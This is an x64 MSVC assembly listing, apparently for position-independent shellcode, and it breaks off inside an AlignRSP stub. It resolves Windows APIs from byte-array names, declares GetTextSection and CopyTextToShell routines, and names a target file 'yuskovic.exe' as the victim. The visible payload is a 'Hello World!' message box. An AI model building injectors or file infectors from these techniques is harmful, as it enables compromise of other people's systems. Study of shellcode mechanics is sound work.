; Listing generated by Microsoft (R) Optimizing Compiler Version 19.41.34123.0 

include listing.inc

PUBLIC	?kernel32_str@@3PA_WA				; kernel32_str
PUBLIC	?load_lib_str@@3PADA				; load_lib_str
PUBLIC	?kernel32_dll_name@@3PA_WA			; kernel32_dll_name
PUBLIC	?load_lib_name@@3PADA				; load_lib_name
PUBLIC	?get_proc_name@@3PADA				; get_proc_name
PUBLIC	?kr32_dll_name@@3PADA				; kr32_dll_name
PUBLIC	?user32_dll_name@@3PADA				; user32_dll_name
PUBLIC	?ucrtbase_dll_name@@3PADA			; ucrtbase_dll_name
PUBLIC	?message_box_name@@3PADA			; message_box_name
PUBLIC	?cf_name@@3PADA					; cf_name
PUBLIC	?rf_name@@3PADA					; rf_name
PUBLIC	?close_handle_name@@3PADA			; close_handle_name
PUBLIC	?mb_to_wc_name@@3PADA				; mb_to_wc_name
PUBLIC	?strncmp_name@@3PADA				; strncmp_name
PUBLIC	?get_file_size_name@@3PADA			; get_file_size_name
PUBLIC	?map_view_of_file_name@@3PADA			; map_view_of_file_name
PUBLIC	?unmap_view_of_file_name@@3PADA			; unmap_view_of_file_name
PUBLIC	?create_file_mapping_name@@3PADA		; create_file_mapping_name
PUBLIC	?msg_content@@3PA_WA				; msg_content
PUBLIC	?msg_title@@3PA_WA				; msg_title
PUBLIC	?fileName@@3PADA				; fileName
PUBLIC	?fileName_vic@@3PADA				; fileName_vic
PUBLIC	?func_name@@3PADA				; func_name
PUBLIC	?buffer@@3PADA					; buffer
PUBLIC	?bytesRead@@3KA					; bytesRead
PUBLIC	?wide_buffer@@3PA_WA				; wide_buffer
PUBLIC	?malloc_name@@3PADA				; malloc_name
PUBLIC	?memcpy_name@@3PADA				; memcpy_name
PUBLIC	?_LoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA	; _LoadLibraryA
PUBLIC	?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA ; _GetProcAddress
PUBLIC	?_GetFileSize@@3P6AKPEAXPEAK@ZEA		; _GetFileSize
PUBLIC	?_MapViewOfFile@@3P6APEAXPEAXKKK_K@ZEA		; _MapViewOfFile
PUBLIC	?_UnmapViewOfFile@@3P6AHPEBX@ZEA		; _UnmapViewOfFile
PUBLIC	?_CreateFileMappingA@@3P6APEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZEA ; _CreateFileMappingA
PUBLIC	?_ReadFile@@3P6AHPEAX0KPEAKPEAU_OVERLAPPED@@@ZEA ; _ReadFile
PUBLIC	?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA	; _MessageBoxW
PUBLIC	?_MultiByteToWideChar@@3P6AHIKPEBDHPEA_WH@ZEA	; _MultiByteToWideChar
PUBLIC	?_CloseHandle@@3P6AHPEAX@ZEA			; _CloseHandle
PUBLIC	?_strncmp@@3P6AHPEBD0_K@ZEA			; _strncmp
PUBLIC	?_strcpy_s@@3P6AHPEAD_KPEBD@ZEA			; _strcpy_s
PUBLIC	?_ZeroMemory@@3P6AXPEAX_K@ZEA			; _ZeroMemory
PUBLIC	?_SetFilePointer@@3P6AKPEAXJPEAJK@ZEA		; _SetFilePointer
PUBLIC	?_SetEndOfFile@@3P6AHPEAX@ZEA			; _SetEndOfFile
PUBLIC	?_malloc@@3P6APEAX_K@ZEA			; _malloc
PUBLIC	?_memcpy@@3P6APEAXPEAXPEBX_K@ZEA		; _memcpy
PUBLIC	?_CreateFileA@@3P6APEAXPEBDKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@ZEA ; _CreateFileA
PUBLIC	?_WriteFile@@3P6AHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@ZEA ; _WriteFile
PUBLIC	?_memset@@3P6APEAXPEAXH_K@ZEA			; _memset
PUBLIC	?_FlushViewOfFile@@3P6AHPEBX_K@ZEA		; _FlushViewOfFile
_BSS	SEGMENT
?buffer@@3PADA DB 040H DUP (?)				; buffer
?bytesRead@@3KA DD 01H DUP (?)				; bytesRead
?wide_buffer@@3PA_WA DW 040H DUP (?)			; wide_buffer
	ALIGN	8

?_LoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA DQ 01H DUP (?) ; _LoadLibraryA
?_GetProcAddress@@3P6AP6A_JXZPEAUHINSTANCE__@@PEBD@ZEA DQ 01H DUP (?) ; _GetProcAddress
?_GetFileSize@@3P6AKPEAXPEAK@ZEA DQ 01H DUP (?)		; _GetFileSize
?_MapViewOfFile@@3P6APEAXPEAXKKK_K@ZEA DQ 01H DUP (?)	; _MapViewOfFile
?_UnmapViewOfFile@@3P6AHPEBX@ZEA DQ 01H DUP (?)		; _UnmapViewOfFile
?_CreateFileMappingA@@3P6APEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZEA DQ 01H DUP (?) ; _CreateFileMappingA
?_ReadFile@@3P6AHPEAX0KPEAKPEAU_OVERLAPPED@@@ZEA DQ 01H DUP (?) ; _ReadFile
?_MessageBoxW@@3P6AHPEAUHWND__@@PEB_W1I@ZEA DQ 01H DUP (?) ; _MessageBoxW
?_MultiByteToWideChar@@3P6AHIKPEBDHPEA_WH@ZEA DQ 01H DUP (?) ; _MultiByteToWideChar
?_CloseHandle@@3P6AHPEAX@ZEA DQ 01H DUP (?)		; _CloseHandle
?_strncmp@@3P6AHPEBD0_K@ZEA DQ 01H DUP (?)		; _strncmp
?_strcpy_s@@3P6AHPEAD_KPEBD@ZEA DQ 01H DUP (?)		; _strcpy_s
?_ZeroMemory@@3P6AXPEAX_K@ZEA DQ 01H DUP (?)		; _ZeroMemory
?_SetFilePointer@@3P6AKPEAXJPEAJK@ZEA DQ 01H DUP (?)	; _SetFilePointer
?_SetEndOfFile@@3P6AHPEAX@ZEA DQ 01H DUP (?)		; _SetEndOfFile
?_malloc@@3P6APEAX_K@ZEA DQ 01H DUP (?)			; _malloc
?_memcpy@@3P6APEAXPEAXPEBX_K@ZEA DQ 01H DUP (?)		; _memcpy
?_CreateFileA@@3P6APEAXPEBDKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@ZEA DQ 01H DUP (?) ; _CreateFileA
?_WriteFile@@3P6AHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@ZEA DQ 01H DUP (?) ; _WriteFile
?_memset@@3P6APEAXPEAXH_K@ZEA DQ 01H DUP (?)		; _memset
?_FlushViewOfFile@@3P6AHPEBX_K@ZEA DQ 01H DUP (?)	; _FlushViewOfFile
_BSS	ENDS
CONST	SEGMENT
$SG90686 DB	'CreateFileA', 00H
	ORG $+4
$SG90687 DB	'strcpy_s', 00H
	ORG $+7
$SG90688 DB	'ZeroMemory', 00H
	ORG $+5
$SG90689 DB	'SetFilePointer', 00H
	ORG $+1
$SG90690 DB	'SetEndOfFile', 00H
	ORG $+3
$SG90691 DB	'WriteFile', 00H
	ORG $+6
$SG90692 DB	'FlushViewOfFile', 00H
$SG90693 DB	'memset', 00H
	ORG $+1
$SG90727 DB	'.text', 00H
	ORG $+2
$SG90746 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90747 DB	'I', 00H, 'n', 00H, 'i', 00H, 'c', 00H, 'i', 00H, 'o', 00H
	DB	00H, 00H
	ORG $+2
$SG90749 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90750 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'a', 00H, 'l', 00H, ' ', 00H, 'a', 00H, 'b', 00H, 'r', 00H, 'i'
	DB	00H, 'r', 00H, ' ', 00H, 'e', 00H, 'l', 00H, ' ', 00H, 'a', 00H
	DB	'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H, 'v', 00H, 'o', 00H, 00H
	DB	00H
	ORG $+4
$SG90751 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90752 DB	'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ' ', 00H, 'w', 00H
	DB	'a', 00H, 's', 00H, ' ', 00H, 'o', 00H, 'p', 00H, 'e', 00H, 'n'
	DB	00H, 'e', 00H, 'd', 00H, ' ', 00H, 'f', 00H, 'o', 00H, 'r', 00H
	DB	' ', 00H, 'r', 00H, 'e', 00H, 'a', 00H, 'd', 00H, 00H, 00H
	ORG $+6
$SG90753 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90754 DB	'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ' ', 00H, 'w', 00H
	DB	'a', 00H, 's', 00H, ' ', 00H, 'r', 00H, 'e', 00H, 'a', 00H, 'd'
	DB	00H, 00H, 00H
	ORG $+4
$SG90757 DB	'C', 00H, 'o', 00H, 'n', 00H, 't', 00H, 'e', 00H, 'n', 00H
	DB	'i', 00H, 'd', 00H, 'o', 00H, ' ', 00H, 'd', 00H, 'e', 00H, 'l'
	DB	00H, ' ', 00H, 'A', 00H, 'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H
	DB	'v', 00H, 'o', 00H, 00H, 00H
	ORG $+4
$SG90758 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90759 DB	'I', 00H, ' ', 00H, 'c', 00H, 'a', 00H, 'n', 00H, 't', 00H
	DB	' ', 00H, 'r', 00H, 'e', 00H, 'a', 00H, 'd', 00H, ' ', 00H, 'a'
	DB	00H, ' ', 00H, 'm', 00H, 'a', 00H, 'i', 00H, 'n', 00H, ' ', 00H
	DB	'f', 00H, 'i', 00H, 'l', 00H, 'e', 00H, '!', 00H, 00H, 00H
	ORG $+6
$SG90760 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90761 DB	'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ' ', 00H, 'w', 00H
	DB	'a', 00H, 's', 00H, ' ', 00H, 'c', 00H, 'l', 00H, 'o', 00H, 's'
	DB	00H, 'e', 00H, 'd', 00H, 00H, 00H
$SG90763 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90764 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'a', 00H, 'l', 00H, ' ', 00H, 'a', 00H, 'b', 00H, 'r', 00H, 'i'
	DB	00H, 'r', 00H, ' ', 00H, 'e', 00H, 'l', 00H, ' ', 00H, 'a', 00H
	DB	'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H, 'v', 00H, 'o', 00H, 00H
	DB	00H
	ORG $+4
$SG90765 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90766 DB	'_', 00H, 'C', 00H, 'r', 00H, 'e', 00H, 'a', 00H, 't', 00H
	DB	'e', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, 'A', 00H, 00H
	DB	00H
	ORG $+6
$SG90767 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90768 DB	'G', 00H, 'e', 00H, 't', 00H, 'F', 00H, 'i', 00H, 'l', 00H
	DB	'e', 00H, 'S', 00H, 'i', 00H, 'z', 00H, 'e', 00H, '(', 00H, 'h'
	DB	00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ',', 00H, ' ', 00H
	DB	'N', 00H, 'U', 00H, 'L', 00H, 'L', 00H, ')', 00H, 00H, 00H
	ORG $+6
$SG90770 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90771 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'c', 00H, 'r', 00H, 'e', 00H, 'a', 00H, 't', 00H, 'i', 00H, 'n'
	DB	00H, 'g', 00H, ' ', 00H, 'f', 00H, 'i', 00H, 'l', 00H, 'e', 00H
	DB	' ', 00H, 'm', 00H, 'a', 00H, 'p', 00H, 'p', 00H, 'i', 00H, 'n'
	DB	00H, 'g', 00H, '.', 00H, 00H, 00H
	ORG $+6
$SG90772 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90773 DB	'G', 00H, 'e', 00H, 't', 00H, 'F', 00H, 'i', 00H, 'l', 00H
	DB	'e', 00H, 'S', 00H, 'i', 00H, 'z', 00H, 'e', 00H, '(', 00H, 'h'
	DB	00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ',', 00H, ' ', 00H
	DB	'N', 00H, 'U', 00H, 'L', 00H, 'L', 00H, ')', 00H, 00H, 00H
	ORG $+6
$SG90775 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90776 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'm', 00H, 'a', 00H, 'p', 00H, 'p', 00H, 'i', 00H, 'n', 00H, 'g'
	DB	00H, ' ', 00H, 'v', 00H, 'i', 00H, 'e', 00H, 'w', 00H, ' ', 00H
	DB	'o', 00H, 'f', 00H, ' ', 00H, 'f', 00H, 'i', 00H, 'l', 00H, 'e'
	DB	00H, '.', 00H, '.', 00H, 00H, 00H
	ORG $+6
$SG90777 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90778 DB	'M', 00H, 'a', 00H, 'p', 00H, 'V', 00H, 'i', 00H, 'e', 00H
	DB	'w', 00H, 'O', 00H, 'f', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e'
	DB	00H, '(', 00H, 'h', 00H, 'M', 00H, 'a', 00H, 'p', 00H, 'p', 00H
	DB	'i', 00H, 'n', 00H, 'g', 00H, ',', 00H, ' ', 00H, 'F', 00H, 'I'
	DB	00H, 'L', 00H, 'E', 00H, '_', 00H, 'M', 00H, 'A', 00H, 'P', 00H
	DB	'_', 00H, 'R', 00H, 'E', 00H, 'A', 00H, 'D', 00H, ',', 00H, ' '
	DB	00H, '0', 00H, ',', 00H, ' ', 00H, '0', 00H, ',', 00H, ' ', 00H
	DB	'0', 00H, ')', 00H, 00H, 00H
$SG90781 DB	'A', 00H, 'v', 00H, 'i', 00H, 's', 00H, 'o', 00H, 00H, 00H
	ORG $+4
$SG90782 DB	'S', 00H, 'e', 00H, 'c', 00H, 'c', 00H, 'i', 00H, 0f3H, 00H
	DB	'n', 00H, ' ', 00H, '.', 00H, 't', 00H, 'e', 00H, 'x', 00H, 't'
	DB	00H, ' ', 00H, 'e', 00H, 'n', 00H, 'c', 00H, 'o', 00H, 'n', 00H
	DB	't', 00H, 'r', 00H, 'a', 00H, 'd', 00H, 'a', 00H, '.', 00H, 00H
	DB	00H
	ORG $+4
$SG90783 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+12
$SG90784 DB	'N', 00H, 'o', 00H, ' ', 00H, 's', 00H, 'e', 00H, ' ', 00H
	DB	'e', 00H, 'n', 00H, 'c', 00H, 'o', 00H, 'n', 00H, 't', 00H, 'r'
	DB	00H, 0f3H, 00H, ' ', 00H, 'l', 00H, 'a', 00H, ' ', 00H, 's', 00H
	DB	'e', 00H, 'c', 00H, 'c', 00H, 'i', 00H, 0f3H, 00H, 'n', 00H, ' '
	DB	00H, '.', 00H, 't', 00H, 'e', 00H, 'x', 00H, 't', 00H, '.', 00H
	DB	00H, 00H
	ORG $+6
$SG90785 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 0f3H, 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90786 DB	'G', 00H, 'e', 00H, 't', 00H, 'T', 00H, 'e', 00H, 'x', 00H
	DB	't', 00H, 'S', 00H, 'e', 00H, 'c', 00H, 't', 00H, 'i', 00H, 'o'
	DB	00H, 'n', 00H, '(', 00H, 'e', 00H, 'x', 00H, 'e', 00H, 'B', 00H
	DB	'a', 00H, 's', 00H, 'e', 00H, ',', 00H, ' ', 00H, '&', 00H, 's'
	DB	00H, 'e', 00H, 'c', 00H, 't', 00H, 'i', 00H, 'o', 00H, 'n', 00H
	DB	'S', 00H, 'i', 00H, 'z', 00H, 'e', 00H, ')', 00H, 00H, 00H
	ORG $+4
$SG90787 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 0f3H, 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90788 DB	'U', 00H, 'n', 00H, 'm', 00H, 'a', 00H, 'p', 00H, 'V', 00H
	DB	'i', 00H, 'e', 00H, 'w', 00H, 'O', 00H, 'f', 00H, 'F', 00H, 'i'
	DB	00H, 'l', 00H, 'e', 00H, '(', 00H, 'e', 00H, 'x', 00H, 'e', 00H
	DB	'B', 00H, 'a', 00H, 's', 00H, 'e', 00H, ')', 00H, 00H, 00H
	ORG $+6
$SG90789 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 0f3H, 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90790 DB	'_', 00H, 'C', 00H, 'l', 00H, 'o', 00H, 's', 00H, 'e', 00H
	DB	'H', 00H, 'a', 00H, 'n', 00H, 'd', 00H, 'l', 00H, 'e', 00H, '('
	DB	00H, 'h', 00H, 'M', 00H, 'a', 00H, 'p', 00H, 'p', 00H, 'i', 00H
	DB	'n', 00H, 'g', 00H, ')', 00H, 00H, 00H
	ORG $+2
$SG90791 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 0f3H, 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90792 DB	'_', 00H, 'C', 00H, 'l', 00H, 'o', 00H, 's', 00H, 'e', 00H
	DB	'H', 00H, 'a', 00H, 'n', 00H, 'd', 00H, 'l', 00H, 'e', 00H, '('
	DB	00H, 'h', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ')', 00H
	DB	00H, 00H
$SG90793 DB	'output.txt', 00H
	ORG $+5
$SG90795 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+12
$SG90796 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'a', 00H, 'l', 00H, ' ', 00H, 'a', 00H, 'b', 00H, 'r', 00H, 'i'
	DB	00H, 'r', 00H, ' ', 00H, 'e', 00H, 'l', 00H, ' ', 00H, 'a', 00H
	DB	'r', 00H, 'c', 00H, 'h', 00H, 'i', 00H, 'v', 00H, 'o', 00H, ' '
	DB	00H, 'd', 00H, 'e', 00H, ' ', 00H, 's', 00H, 'a', 00H, 'l', 00H
	DB	'i', 00H, 'd', 00H, 'a', 00H, 00H, 00H
$SG90797 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 0f3H, 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90798 DB	'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ' ', 00H, 'o', 00H
	DB	'p', 00H, 'e', 00H, 'n', 00H, 'e', 00H, 'd', 00H, ' ', 00H, 'f'
	DB	00H, 'o', 00H, 'r', 00H, ' ', 00H, 'w', 00H, 'r', 00H, 'i', 00H
	DB	't', 00H, 'i', 00H, 'n', 00H, 'g', 00H, 00H, 00H
$SG90800 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, 00H, 00H
	ORG $+4
$SG90801 DB	'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'w', 00H, 'r', 00H, 'i', 00H, 't', 00H, 'i', 00H, 'n', 00H, 'g'
	DB	00H, ' ', 00H, 't', 00H, 'o', 00H, ' ', 00H, 'f', 00H, 'i', 00H
	DB	'l', 00H, 'e', 00H, 00H, 00H
	ORG $+4
$SG90803 DB	'W', 00H, 'a', 00H, 'r', 00H, 'n', 00H, 'i', 00H, 'n', 00H
	DB	'g', 00H, 00H, 00H
$SG90804 DB	'N', 00H, 'o', 00H, 't', 00H, ' ', 00H, 'a', 00H, 'l', 00H
	DB	'l', 00H, ' ', 00H, 'd', 00H, 'a', 00H, 't', 00H, 'a', 00H, ' '
	DB	00H, 'w', 00H, 'a', 00H, 's', 00H, ' ', 00H, 'w', 00H, 'r', 00H
	DB	'i', 00H, 't', 00H, 't', 00H, 'e', 00H, 'n', 00H, ' ', 00H, 't'
	DB	00H, 'o', 00H, ' ', 00H, 't', 00H, 'h', 00H, 'e', 00H, ' ', 00H
	DB	'f', 00H, 'i', 00H, 'l', 00H, 'e', 00H, 00H, 00H
	ORG $+6
$SG90805 DB	'D', 00H, 'e', 00H, 'p', 00H, 'u', 00H, 'r', 00H, 'a', 00H
	DB	'c', 00H, 'i', 00H, 0f3H, 00H, 'n', 00H, 00H, 00H
	ORG $+2
$SG90806 DB	'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ' ', 00H, 'w', 00H
	DB	'r', 00H, 'i', 00H, 't', 00H, 'e', 00H, ' ', 00H, 'c', 00H, 'o'
	DB	00H, 'm', 00H, 'p', 00H, 'l', 00H, 'e', 00H, 't', 00H, 'e', 00H
	DB	'd', 00H, 00H, 00H
CONST	ENDS
_DATA	SEGMENT
?kernel32_dll_name@@3PA_WA DW 06bH			; kernel32_dll_name
	DW	065H
	DW	072H
	DW	06eH
	DW	065H
	DW	06cH
	DW	033H
	DW	032H
	DW	02eH
	DW	064H
	DW	06cH
	DW	06cH
	DW	00H
	ORG $+6
?load_lib_name@@3PADA DB 04cH				; load_lib_name
	DB	06fH
	DB	061H
	DB	064H
	DB	04cH
	DB	069H
	DB	062H
	DB	072H
	DB	061H
	DB	072H
	DB	079H
	DB	041H
	DB	00H
	ORG $+3
?get_proc_name@@3PADA DB 047H				; get_proc_name
	DB	065H
	DB	074H
	DB	050H
	DB	072H
	DB	06fH
	DB	063H
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	065H
	DB	073H
	DB	073H
	DB	00H
	ORG $+1
?kr32_dll_name@@3PADA DB 06bH				; kr32_dll_name
	DB	065H
	DB	072H
	DB	06eH
	DB	065H
	DB	06cH
	DB	033H
	DB	032H
	DB	02eH
	DB	064H
	DB	06cH
	DB	06cH
	DB	00H
	ORG $+3
?user32_dll_name@@3PADA DB 075H				; user32_dll_name
	DB	073H
	DB	065H
	DB	072H
	DB	033H
	DB	032H
	DB	02eH
	DB	064H
	DB	06cH
	DB	06cH
	DB	00H
	ORG $+5
?ucrtbase_dll_name@@3PADA DB 075H			; ucrtbase_dll_name
	DB	063H
	DB	072H
	DB	074H
	DB	062H
	DB	061H
	DB	073H
	DB	065H
	DB	02eH
	DB	064H
	DB	06cH
	DB	06cH
	ORG $+4
?message_box_name@@3PADA DB 04dH			; message_box_name
	DB	065H
	DB	073H
	DB	073H
	DB	061H
	DB	067H
	DB	065H
	DB	042H
	DB	06fH
	DB	078H
	DB	057H
	DB	00H
	ORG $+4
?cf_name@@3PADA DB 043H					; cf_name
	DB	072H
	DB	065H
	DB	061H
	DB	074H
	DB	065H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	041H
	DB	00H
	ORG $+4
?rf_name@@3PADA DB 052H					; rf_name
	DB	065H
	DB	061H
	DB	064H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	00H
	ORG $+7
?close_handle_name@@3PADA DB 043H			; close_handle_name
	DB	06cH
	DB	06fH
	DB	073H
	DB	065H
	DB	048H
	DB	061H
	DB	06eH
	DB	064H
	DB	06cH
	DB	065H
	DB	00H
	ORG $+4
?mb_to_wc_name@@3PADA DB 04dH				; mb_to_wc_name
	DB	075H
	DB	06cH
	DB	074H
	DB	069H
	DB	042H
	DB	079H
	DB	074H
	DB	065H
	DB	054H
	DB	06fH
	DB	057H
	DB	069H
	DB	064H
	DB	065H
	DB	043H
	DB	068H
	DB	061H
	DB	072H
	DB	00H
	ORG $+4
?strncmp_name@@3PADA DB 073H				; strncmp_name
	DB	074H
	DB	072H
	DB	06eH
	DB	063H
	DB	06dH
	DB	070H
	DB	00H
?get_file_size_name@@3PADA DB 047H			; get_file_size_name
	DB	065H
	DB	074H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	053H
	DB	069H
	DB	07aH
	DB	065H
	DB	00H
	ORG $+4
?map_view_of_file_name@@3PADA DB 04dH			; map_view_of_file_name
	DB	061H
	DB	070H
	DB	056H
	DB	069H
	DB	065H
	DB	077H
	DB	04fH
	DB	066H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	00H
	ORG $+2
?unmap_view_of_file_name@@3PADA DB 055H			; unmap_view_of_file_name
	DB	06eH
	DB	06dH
	DB	061H
	DB	070H
	DB	056H
	DB	069H
	DB	065H
	DB	077H
	DB	04fH
	DB	066H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	00H
?create_file_mapping_name@@3PADA DB 043H		; create_file_mapping_name
	DB	072H
	DB	065H
	DB	061H
	DB	074H
	DB	065H
	DB	046H
	DB	069H
	DB	06cH
	DB	065H
	DB	04dH
	DB	061H
	DB	070H
	DB	070H
	DB	069H
	DB	06eH
	DB	067H
	DB	041H
	DB	00H
	ORG $+5
?msg_content@@3PA_WA DW 048H				; msg_content
	DW	065H
	DW	06cH
	DW	06cH
	DW	06fH
	DW	020H
	DW	057H
	DW	06fH
	DW	072H
	DW	06cH
	DW	064H
	DW	021H
	DW	00H
	ORG $+6
?msg_title@@3PA_WA DW 044H				; msg_title
	DW	065H
	DW	06dH
	DW	06fH
	DW	021H
	DW	00H
	ORG $+4
?fileName@@3PADA DB 063H				; fileName
	DB	02dH
	DB	073H
	DB	068H
	DB	065H
	DB	06cH
	DB	06cH
	DB	063H
	DB	06fH
	DB	064H
	DB	065H
	DB	02eH
	DB	065H
	DB	078H
	DB	065H
	DB	00H
?fileName_vic@@3PADA DB 079H				; fileName_vic
	DB	075H
	DB	073H
	DB	06bH
	DB	06fH
	DB	076H
	DB	069H
	DB	063H
	DB	02eH
	DB	065H
	DB	078H
	DB	065H
	DB	00H
	ORG $+3
?func_name@@3PADA DB 073H				; func_name
	DB	074H
	DB	072H
	DB	06eH
	DB	063H
	DB	06dH
	DB	070H
	DB	00H
?malloc_name@@3PADA DB 06dH				; malloc_name
	DB	061H
	DB	06cH
	DB	06cH
	DB	06fH
	DB	063H
	DB	00H
	ORG $+1
?memcpy_name@@3PADA DB 06dH				; memcpy_name
	DB	065H
	DB	06dH
	DB	063H
	DB	070H
	DB	079H
	DB	00H
_DATA	ENDS
_TEXT	SEGMENT
?load_lib_str@@3PADA DB 'LoadLibraryA', 00H		; load_lib_str
	ORG $+3
?kernel32_str@@3PA_WA DB 'k', 00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H
	DB	'l', 00H, '3', 00H, '2', 00H, '.', 00H, 'd', 00H, 'l', 00H, 'l'
	DB	00H, 00H, 00H				; kernel32_str
_TEXT	ENDS
PUBLIC	?get_module_by_name@@YAPEAXPEA_W@Z		; get_module_by_name
PUBLIC	?get_func_by_name@@YAPEAXPEAXPEAD@Z		; get_func_by_name
PUBLIC	?InitializeFunctions@@YA_NXZ			; InitializeFunctions
PUBLIC	?CopyTextToShell@@YA_NPEAXK@Z			; CopyTextToShell
PUBLIC	?ALIGN_UP@@YAKKK@Z				; ALIGN_UP
PUBLIC	?GetTextSection@@YAPEAXPEAXPEAK@Z		; GetTextSection
PUBLIC	main

;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	014H
voltbl	ENDS

; Function compile flags: /Odtp
_TEXT	SEGMENT

; https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm

; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior
; to calling the entry point of the payload. This is necessary because 64-bit functions
; in Windows assume that they were called with 16-byte stack alignment. When amd64
; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely
; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)
; alignment.

AlignRSP PROC
    push rsi ; Preserve RSI since we're stomping on it
    mov rsi, rsp ; Save the value of RSP so it can be restored
    and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
    sub rsp, 020h ; Allocate homing space for ExecutePayloadd
    call main ; Call the entry point of the payload
